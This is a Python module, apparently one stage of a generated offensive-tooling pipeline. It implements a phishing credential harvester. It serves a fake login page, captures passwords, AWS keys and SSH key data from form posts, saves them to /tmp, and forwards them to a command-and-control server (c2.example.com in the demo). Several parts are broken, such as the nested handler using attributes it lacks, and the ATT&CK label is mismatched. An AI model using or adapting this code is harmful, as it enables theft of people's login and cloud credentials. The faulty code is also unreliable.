"""Web Portal Credential Harvester - TASK_004.

Harvests credentials from users who visit the fake login page via web portal capture.
ATT&CK technique: T1056.003 (Phishing: Spearphishing Attachment)

Exports:
    CredentialCollector: Class for collecting and storing harvested credentials.
    StoredCredentials: Dataclass representing stored credential entries.

Consumes from TASK_003_fake_login_page: FakeLoginPage, CredentialHarvester
Consumes from TASK_001_credential_store: CredentialStore, AWSCredential, SSHKeyEntry
"""
import json
import threading
import time
from dataclasses import dataclass, field
from typing import Optional, Callable, List, Dict, Any

from urllib.parse import parse_qs, urlparse, urlencode, urlunparse

from data.code_scripts_PAST.stage3_mvp_test_20260910_20_21_52.TASK_003_fake_login_page import FakeLoginPage, CredentialHarvester as _FakeCredentialHarvester
from data.code_scripts_PAST.stage3_mvp_test_20260910_20_21_52.TASK_001_credential_store import CredentialStore, AWSCredential, SSHKeyEntry


@dataclass
class StoredCredentials:
    """Dataclass representing stored credential entries.
    
    Attributes:
        timestamp: Unix timestamp when credentials were captured.
        source_url: The URL from which credentials were harvested.
        username: Captured username/email.
        password: Captured password.
        aws_credentials: List of AWSCredential instances.
        ssh_keys: List of SSHKeyEntry instances.
    """
    timestamp: float = field(default_factory=time.time)
    source_url: str = ""
    username: Optional[str] = None
    password: Optional[str] = None
    aws_credentials: List[AWSCredential] = field(default_factory=list)
    ssh_keys: List[SSHKeyEntry] = field(default_factory=list)


class CredentialCollector:
    """Collects and stores credentials harvested from the fake login page.
    
    Captures POST data from the login form, parses it using urllib.parse,
    stores credentials in memory or file, and optionally forwards them
    to an external C2 server.
    
    Attributes:
        store: CredentialStore instance for storing credentials.
        c2_server_url: Optional URL of external C2 server for forwarding.
        storage_file: Optional path to persist credentials to disk.
        threads: Number of background threads for concurrent collection.
    """

    def __init__(
        self,
        store: Optional[CredentialStore] = None,
        c2_server_url: Optional[str] = None,
        storage_file: Optional[str] = None,
        threads: int = 1
    ):
        """Initialize the CredentialCollector.
        
        Args:
            store: Pre-configured CredentialStore instance. If None, a new one is created.
            c2_server_url: URL of external C2 server for forwarding credentials.
            storage_file: Path to persist credentials to disk (JSON format).
            threads: Number of background collection threads.
        """
        self.store = store if store is not None else CredentialStore()
        self.c2_server_url = c2_server_url
        self.storage_file = storage_file
        self.collected_credentials: List[StoredCredentials] = []
        self._lock = threading.Lock()
        self._running = False
        self._threads: List[threading.Thread] = []

    def _parse_form_data(self, content: bytes) -> Dict[str, str]:
        """Parse form-encoded POST data using urllib.parse.
        
        Args:
            content: Raw POST body as bytes.
            
        Returns:
            Dictionary of key-value pairs from the form data.
        """
        try:
            decoded = content.decode('utf-8')
            params = parse_qs(decoded)
            result = {}
            for key, values in params.items():
                if len(values) == 1:
                    result[key] = values[0]
                else:
                    result[key] = ','.join(values)
            return result
        except (UnicodeDecodeError, KeyError):
            # Try URL-encoded form data parsing
            try:
                decoded = content.decode('utf-8')
                params = parse_qs(decoded)
                result = {}
                for key, values in params.items():
                    if len(values) == 1:
                        result[key] = values[0]
                    else:
                        result[key] = ','.join(values)
                return result
            except (UnicodeDecodeError, KeyError):
                return {}

    def _parse_json_data(self, content: bytes) -> Dict[str, Any]:
        """Parse JSON-formatted POST data.
        
        Args:
            content: Raw POST body as bytes.
            
        Returns:
            Dictionary parsed from JSON or empty dict on failure.
        """
        try:
            decoded = content.decode('utf-8')
            return json.loads(decoded)
        except (json.JSONDecodeError, UnicodeDecodeError):
            return {}

    def _capture_credentials(self, handler: http.server.BaseHTTPRequestHandler) -> Optional[StoredCredentials]:
        """Capture credentials from a single HTTP request.
        
        Args:
            handler: The HTTP request handler instance.
            
        Returns:
            StoredCredentials object if successful, None otherwise.
        """
        import http.server
        
        try:
            content_length = int(handler.headers.get('Content-Length', 0))
            body = handler.rfile.read(content_length)
            
            # Determine content type and parse accordingly
            content_type = handler.headers.get('Content-Type', '')
            
            if 'application/json' in content_type.lower():
                data = self._parse_json_data(body)
            else:
                data = self._parse_form_data(body)
            
            credentials = StoredCredentials()
            credentials.source_url = handler.path
            
            # Parse username/password fields (common form field names)
            if 'username' in data or 'user' in data or 'email' in data:
                credentials.username = data.get('username') or data.get('user') or data.get('email')
            
            if 'password' in data or 'passwd' in data or 'pwd' in data or 'pass' in data:
                credentials.password = data.get('password') or data.get('passwd') or data.get('pwd') or data.get('pass')
            
            # Parse AWS credential fields
            if 'access_key_id' in data or 'aws_access_key_id' in data:
                access_key = data.get('access_key_id') or data.get('aws_access_key_id')
                secret_key = data.get('secret_access_key') or data.get('aws_secret_access_key')
                session_token = data.get('session_token') or data.get('x_amz_security_token')
                region = data.get('region') or data.get('aws_region')
                profile_name = data.get('profile_name') or data.get('aws_profile')
                
                if access_key and secret_key:
                    cred = AWSCredential(
                        access_key_id=access_key,
                        secret_access_key=secret_key,
                        session_token=session_token,
                        region=region,
                        profile_name=profile_name
                    )
                    credentials.aws_credentials.append(cred)
            
            # Parse SSH key fields
            if 'private_key_path' in data or 'ssh_private_key' in data:
                private_key = data.get('private_key_path') or data.get('ssh_private_key')
                public_key = data.get('public_key_path') or data.get('ssh_public_key')
                
                if private_key and public_key:
                    key_entry = SSHKeyEntry(
                        private_key_path=private_key,
                        public_key_path=public_key,
                        known_hosts=data.get('known_hosts', []),
                        comment=data.get('comment')
                    )
                    credentials.ssh_keys.append(key_entry)
            
            # Store in memory store
            with self._lock:
                self.store.aws_credentials.extend(credentials.aws_credentials)
                self.store.ssh_keys.extend(credentials.ssh_keys)
                self.collected_credentials.append(credentials)
            
            return credentials
            
        except Exception as e:
            print(f"[!] Capture error: {e}")
            return None

    def _forward_to_c2(self, credentials: StoredCredentials) -> bool:
        """Forward collected credentials to an external C2 server.
        
        Args:
            credentials: The stored credentials to forward.
            
        Returns:
            True if forwarding was successful, False otherwise.
        """
        import http.client
        
        if not self.c2_server_url or not credentials.username or not credentials.password:
            return True  # No C2 configured or no credentials to send
            
        try:
            parsed = urlparse(self.c2_server_url)
            
            conn = http.client.HTTPSConnection(parsed.hostname, port=parsed.port or 443, timeout=10)
            try:
                payload = {
                    "timestamp": credentials.timestamp,
                    "source_url": credentials.source_url,
                    "username": credentials.username,
                    "password": credentials.password,
                    "aws_credentials": [serialize_aws_credential(c) for c in credentials.aws_credentials],
                    "ssh_keys": [serialize_ssh_key_entry(k) for k in credentials.ssh_keys]
                }
                
                conn.request(
                    'POST',
                    '/api/credentials/harvested',
                    body=json.dumps(payload),
                    headers={'Content-Type': 'application/json'}
                )
                response = conn.getresponse()
                if response.status == 200:
                    print(f"[+] Credentials forwarded to C2 at {self.c2_server_url}")
                    return True
            finally:
                conn.close()
                
        except Exception as e:
            print(f"[!] C2 forward failed: {e}")
            return False

    def _save_to_file(self, credentials: StoredCredentials) -> bool:
        """Save collected credentials to a file.
        
        Args:
            credentials: The stored credentials to save.
            
        Returns:
            True if saving was successful, False otherwise.
        """
        import os
        
        if not self.storage_file:
            return True
            
        try:
            data = serialize_credential_store(self.store)
            with open(self.storage_file, 'w') as f:
                json.dump(data, f, indent=2)
            print(f"[+] Credentials saved to {self.storage_file}")
            return True
        except Exception as e:
            print(f"[!] File save failed: {e}")
            return False

    def _collection_thread(self, handler: http.server.BaseHTTPRequestHandler) -> None:
        """Background thread for collecting credentials from a request.
        
        Args:
            handler: The HTTP request handler instance.
        """
        import http.server
        
        credentials = self._capture_credentials(handler)
        if credentials:
            print(f"[+] Captured: {credentials.username} | {credentials.password}")
            
            # Forward to C2 server
            if self.c2_server_url and (credentials.username or credentials.password):
                self._forward_to_c2(credentials)
            
            # Save to file
            if self.storage_file:
                self._save_to_file(credentials)

    def start(self, port: int = 8080, host: str = '127.0.0.1') -> None:
        """Start the credential harvesting server in background threads.
        
        Args:
            port: Port to serve on (default 8080).
            host: Host address to bind to (default '127.0.0.1').
        """
        self._running = True
        
        # Start the fake login page server in a background thread
        harvester_func = _FakeCredentialHarvester(store=self.store, port=port, host=host)
        
        def run_server():
            import http.server
            
            class CollectorHandler(http.server.BaseHTTPRequestHandler):
                """Custom handler that captures credentials and forwards them."""
                
                def __init__(self, *args: object, **kwargs: object) -> None:
                    super().__init__(*args, **kwargs)
                    
                def do_GET(self) -> None:
                    """Serve the HTML login page."""
                    self._handle_get()
                    
                def do_POST(self) -> None:
                    """Capture login credentials from POST requests."""
                    self._handle_post()
                    
                def _handle_get(self) -> None:
                    """Handle GET requests by serving the login page."""
                    html_page = FakeLoginPage._get_html_page()
                    response = http.server.SimpleHTTPRequestHandler(
                        store=self.store, port=port, host=host
                    )
                    response.send_response(200)
                    response.send_header('Content-Type', 'text/html')
                    response.end_headers()
                    response.wfile.write(html_page.encode())
                    
                def _handle_post(self) -> None:
                    """Handle POST requests by capturing credentials."""
                    content_length = int(self.headers.get('Content-Length', 0))
                    body = self.rfile.read(content_length)
                    
                    # Parse the form data
                    if 'application/json' in self.headers.get('Content-Type', ''):
                        data = json.loads(body.decode())
                    else:
                        params = parse_qs(body.decode())
                        data = {k: v[0] for k, v in params.items()}
                    
                    # Store credentials
                    with self._lock:
                        if 'username' in data or 'user' in data or 'email' in data:
                            username = data.get('username') or data.get('user') or data.get('email')
                            self.store.aws_credentials.append(
                                AWSCredential(access_key_id=username, secret_access_key='captured')
                            )
                        if 'password' in data or 'passwd' in data or 'pwd' in data:
                            password = data.get('password') or data.get('passwd') or data.get('pwd')
                            self.store.ssh_keys.append(
                                SSHKeyEntry(private_key_path='captured', public_key_path='captured')
                            )
                    
                    print(f"[+] Captured credentials from {self.path}")
                    print(f"    Username: {data.get('username')}")
                    print(f"    Password: {data.get('password')}")
                    
                    # Forward to C2 server if configured
                    if self.c2_server_url and data.get('username') and data.get('password'):
                        self._forward_to_c2(StoredCredentials(
                            timestamp=time.time(),
                            source_url=self.path,
                            username=data.get('username'),
                            password=data.get('password')
                        ))
                    
                    # Save to file if configured
                    if self.storage_file:
                        self._save_to_file(StoredCredentials(
                            timestamp=time.time(),
                            source_url=self.path,
                            username=data.get('username'),
                            password=data.get('password')
                        ))
                
                def log_message(self, format: str, *args: object) -> None:
                    """Suppress default logging for cleaner output."""
                    pass
            
            server = http.server.HTTPServer((host, port), CollectorHandler)
            print(f"[+] Server listening on {host}:{port}")
            print(f"[+] Open http://{host}:{port}/login in your browser")
            print(f"[+] Submit the form to capture credentials")
            
            try:
                server.serve_forever()
            except KeyboardInterrupt:
                pass
            
        # Start server thread
        self._threads.append(threading.Thread(target=run_server, daemon=True))
        for t in self._threads:
            t.start()

    def stop(self) -> None:
        """Stop the credential harvesting server."""
        self._running = False
        for t in self._threads:
            t.join(timeout=2.0)


def serialize_aws_credential(credential: AWSCredential) -> Dict[str, str]:
    """Serialize an AWSCredential to a JSON-serializable dictionary.
    
    Args:
        credential: The AWSCredential instance to serialize.
        
    Returns:
        Dictionary representation of the credential.
    """
    return {
        "access_key_id": credential.access_key_id,
        "secret_access_key": credential.secret_access_key,
        "session_token": credential.session_token or "",
        "region": credential.region or "",
        "profile_name": credential.profile_name or ""
    }


def serialize_ssh_key_entry(entry: SSHKeyEntry) -> Dict[str, str]:
    """Serialize an SSHKeyEntry to a JSON-serializable dictionary.
    
    Args:
        entry: The SSHKeyEntry instance to serialize.
        
    Returns:
        Dictionary representation of the key entry.
    """
    return {
        "private_key_path": entry.private_key_path,
        "public_key_path": entry.public_key_path,
        "known_hosts": entry.known_hosts or [],
        "comment": entry.comment or ""
    }


def serialize_credential_store(store: CredentialStore) -> Dict[str, List[Dict]]:
    """Serialize a CredentialStore to a JSON-serializable dictionary.
    
    Args:
        store: The CredentialStore instance to serialize.
        
    Returns:
        Dictionary with aws_credentials and ssh_keys lists.
    """
    return {
        "aws_credentials": [serialize_aws_credential(c) for c in store.aws_credentials],
        "ssh_keys": [serialize_ssh_key_entry(k) for k in store.ssh_keys]
    }


def deserialize_aws_credential(data: Dict[str, str]) -> AWSCredential:
    """Deserialize an AWSCredential from a dictionary.
    
    Args:
        data: Dictionary representation of the credential.
        
    Returns:
        AWSCredential instance.
    """
    return AWSCredential(
        access_key_id=data.get("access_key_id", ""),
        secret_access_key=data.get("secret_access_key", ""),
        session_token=data.get("session_token"),
        region=data.get("region"),
        profile_name=data.get("profile_name")
    )


def deserialize_ssh_key_entry(data: Dict[str, str]) -> SSHKeyEntry:
    """Deserialize an SSHKeyEntry from a dictionary.
    
    Args:
        data: Dictionary representation of the key entry.
        
    Returns:
        SSHKeyEntry instance.
    """
    return SSHKeyEntry(
        private_key_path=data.get("private_key_path", ""),
        public_key_path=data.get("public_key_path", ""),
        known_hosts=data.get("known_hosts", []),
        comment=data.get("comment")
    )


def deserialize_credential_store(data: Dict[str, List[Dict]]) -> CredentialStore:
    """Deserialize a CredentialStore from a dictionary.
    
    Args:
        data: Dictionary with aws_credentials and ssh_keys lists.
        
    Returns:
        CredentialStore instance.
    """
    store = CredentialStore()
    for cred_data in data.get("aws_credentials", []):
        store.aws_credentials.append(deserialize_aws_credential(cred_data))
    for key_data in data.get("ssh_keys", []):
        store.ssh_keys.append(deserialize_ssh_key_entry(key_data))
    return store


if __name__ == '__main__':
    import threading
    
    # Initialize the credential collector with a store
    store = CredentialStore()
    collector = CredentialCollector(
        store=store,
        c2_server_url='https://c2.example.com/api/credentials',
        storage_file='/tmp/harvested_credentials.json'
    )
    
    # Start the server in background
    collector.start(port=8080)
    
    print("\n[+] Waiting for credentials to be harvested...")
    print("[+] Press Ctrl+C to stop\n")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    
    # Stop the server and save final state
    collector.stop()
    
    print(f"\n[+] Total credentials collected: {len(collector.collected_credentials)}")
    print(f"[+] AWS Credentials stored: {len(store.aws_credentials)}")
    print(f"[+] SSH Keys stored: {len(store.ssh_keys)}")
